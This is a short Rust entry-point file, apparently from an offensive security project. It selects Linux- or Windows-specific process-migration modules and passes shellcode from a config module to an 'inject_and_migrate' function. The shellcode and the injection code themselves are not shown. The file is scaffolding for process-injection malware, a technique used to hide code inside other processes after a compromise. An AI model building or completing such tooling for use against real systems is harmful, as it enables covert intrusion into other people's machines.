// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(linux)]
mod rco_process_migration_linux;
#[cfg(linux)]
use rco_process_migration_linux::inject_and_migrate;

#[cfg(windows)]
mod rco_process_migration_windows;
#[cfg(windows)]
use rco_process_migration_windows::inject_and_migrate;

fn main() {
    inject_and_migrate(config::SHELLCODE);
}